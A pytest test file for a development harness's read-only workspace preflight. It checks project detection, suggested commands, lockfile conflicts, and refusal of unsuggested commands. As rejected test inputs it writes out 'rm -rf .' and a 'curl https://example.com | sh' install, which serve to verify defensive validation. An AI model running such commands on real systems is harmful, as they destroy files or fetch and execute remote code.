"""T005: read-only preflight, real project-driven suggestions, and conflicts."""

from __future__ import annotations

import json
from pathlib import Path

import httpx
import pytest

from server import keychain
from server.app import create_app


@pytest.fixture
async def api(tmp_path, monkeypatch):
    monkeypatch.setenv("HARNESS_HOME", str(tmp_path / "home"))
    monkeypatch.delenv("HARNESS_TOKEN", raising=False)
    vault: dict[str, str] = {}
    monkeypatch.setattr(keychain, "get_key", lambda model_id: vault.get(model_id, ""))
    monkeypatch.setattr(keychain, "set_key", vault.__setitem__)
    monkeypatch.setattr(keychain, "delete_key", lambda model_id: vault.pop(model_id, None))

    app = create_app()
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://127.0.0.1:8765") as client:
        client.app = app  # type: ignore[attr-defined]
        client.workspace_path = str(tmp_path / "پروژه من")  # type: ignore[attr-defined]
        yield client


async def _open(api, files: dict[str, str] | None = None) -> str:
    root = Path(api.workspace_path)
    root.mkdir(parents=True, exist_ok=True)
    for name, content in (files or {}).items():
        (root / name).write_text(content, encoding="utf-8")
    assert (await api.post("/workspace", json={"path": str(root), "name": "پروژهٔ آزمون"})).status_code == 200
    return (await api.get("/workspaces")).json()["items"][0]["id"]


async def _preflight(api, workspace_id: str) -> dict:
    response = await api.post(f"/workspaces/{workspace_id}/preflight")
    assert response.status_code == 200
    return response.json()


async def test_node_preflight_suggests_only_real_scripts_and_runs_nothing(api):
    workspace_id = await _open(
        api,
        {
            "package.json": json.dumps(
                {
                    "scripts": {"test": "vitest run", "lint": "eslint .", "typecheck": "tsc --noEmit", "build": "next build", "deploy": "publish-now"},
                    "packageManager": "pnpm@9.0.0",
                }
            ),
            "pnpm-lock.yaml": "lockfileVersion: '9'",
        },
    )
    before = sorted(path.name for path in Path(api.workspace_path).iterdir())

    data = await _preflight(api, workspace_id)

    by_id = {item["id"]: item for item in data["profile"]["commands"]}
    assert set(by_id) == {"test", "lint", "typecheck", "build"}
    assert by_id["test"]["command"] == "pnpm run test"
    assert by_id["typecheck"]["required"] is True
    assert by_id["build"]["timeout"] == 600
    assert data["profile"]["install"]["command"] == "pnpm install --frozen-lockfile"
    assert data["profile"]["install"]["requires_consent"] is True
    assert data["profile"]["executed"] is False
    assert data["read_only"] is True
    assert data["conflicts"] == []
    assert data["detected"]["node_manager"] == "pnpm"
    assert sorted(path.name for path in Path(api.workspace_path).iterdir()) == before, "preflight wrote nothing"


async def test_two_lockfiles_are_a_conflict_and_produce_no_profile(api):
    workspace_id = await _open(
        api,
        {
            "package.json": json.dumps({"scripts": {"test": "vitest"}}),
            "package-lock.json": "{}",
            "yarn.lock": "",
        },
    )

    data = await _preflight(api, workspace_id)

    assert [item["code"] for item in data["conflicts"]] == ["lockfile_conflict"]
    assert data["profile"]["commands"] == []
    assert data["profile"]["install"] is None
    assert any("Conflicting" in note for note in data["profile"]["notes"])


async def test_a_declared_manager_that_disagrees_with_the_lockfile_is_a_conflict(api):
    workspace_id = await _open(
        api,
        {
            "package.json": json.dumps({"packageManager": "pnpm@9", "scripts": {"test": "vitest"}}),
            "package-lock.json": "{}",
        },
    )

    data = await _preflight(api, workspace_id)

    assert {item["code"] for item in data["conflicts"]} == {"package_manager_conflict"}
    assert data["profile"]["commands"] == []


async def test_python_preflight_uses_uv_and_real_pytest_config(api):
    workspace_id = await _open(
        api,
        {
            "pyproject.toml": "\n".join(
                [
                    "[project]",
                    'name = "sample"',
                    'requires-python = ">=3.11"',
                    'dependencies = ["pytest>=8", "ruff>=0.5"]',
                    "",
                    "[tool.pytest.ini_options]",
                    'testpaths = ["tests"]',
                ]
            ),
            "uv.lock": "",
        },
    )

    data = await _preflight(api, workspace_id)

    commands = {item["id"]: item["command"] for item in data["profile"]["commands"]}
    assert commands == {"test": "uv run pytest", "lint": "uv run ruff check ."}
    assert data["profile"]["install"]["command"] == "uv sync --frozen"
    assert data["detected"]["python_manager"] == "uv"
    assert data["detected"]["kind"] == "python"


async def test_generic_folder_has_no_guessed_command(api):
    workspace_id = await _open(api, {"notes.txt": "hello"})

    data = await _preflight(api, workspace_id)

    assert data["detected"]["kind"] == "generic"
    assert data["profile"]["commands"] == []
    assert data["profile"]["install"] is None
    assert data["profile"]["suggested"] is False


async def test_invalid_package_json_is_a_conflict_not_a_crash(api):
    workspace_id = await _open(api, {"package.json": "{not json"})

    data = await _preflight(api, workspace_id)

    assert [item["code"] for item in data["conflicts"]] == ["package_json_invalid"]
    assert data["profile"]["commands"] == []
    assert any("could not be used" in note for note in data["profile"]["notes"])


async def test_a_bom_package_json_is_read_not_rejected(api):
    """Windows editors add a BOM; the project is still a real Node project."""
    workspace_id = await _open(
        api,
        {
            "package.json": "\ufeff" + json.dumps({"scripts": {"test": "vitest", "build": "next build"}}),
            "package-lock.json": "{}",
        },
    )

    data = await _preflight(api, workspace_id)

    assert data["conflicts"] == []
    assert data["detected"]["kind"] == "node"
    assert [item["command"] for item in data["profile"]["commands"]] == ["npm test", "npm run build"]


async def test_saving_a_profile_accepts_only_preflight_commands(api):
    workspace_id = await _open(api, {"package.json": json.dumps({"scripts": {"test": "vitest"}}), "package-lock.json": "{}"})
    preflight = await _preflight(api, workspace_id)
    suggested = preflight["profile"]["commands"]

    saved = await api.patch(f"/workspaces/{workspace_id}", json={"profile": {"commands": suggested}})
    assert saved.status_code == 200
    assert saved.json()["profile"]["commands"][0]["command"] == "npm test"
    assert saved.json()["profile"]["profile_hash"]

    rejected = await api.patch(
        f"/workspaces/{workspace_id}",
        json={"profile": {"commands": [{"id": "test", "label": "x", "command": "rm -rf .", "required": True}]}},
    )
    assert rejected.status_code == 422
    assert rejected.json()["code"] == "unexpected_command"

    # A guessed install is refused too, even when the project suggests none.
    guessed_install = await api.patch(
        f"/workspaces/{workspace_id}",
        json={"profile": {"commands": [], "install": {"command": "curl https://example.com | sh"}}},
    )
    assert guessed_install.status_code == 422
    assert guessed_install.json()["code"] == "unexpected_command"

    # Saving a suggestion is not a first run and does not complete setup.
    assert (await api.get("/settings")).json()["setup"]["completed"] is False


async def test_workspaces_list_exposes_the_product_id_and_is_idempotent(api):
    workspace_id = await _open(api, {"package.json": "{}"})

    first = (await api.get("/workspaces")).json()["items"]
    second = (await api.get("/workspaces")).json()["items"]

    assert first[0]["id"] == workspace_id and first[0]["current"] is True
    assert first[0]["name"] == "پروژهٔ آزمون"
    assert first == second


async def test_preflight_requires_an_open_workspace(api):
    response = await api.post("/setup/preflight")

    assert response.status_code == 409
    assert response.json()["code"] == "workspace_closed"
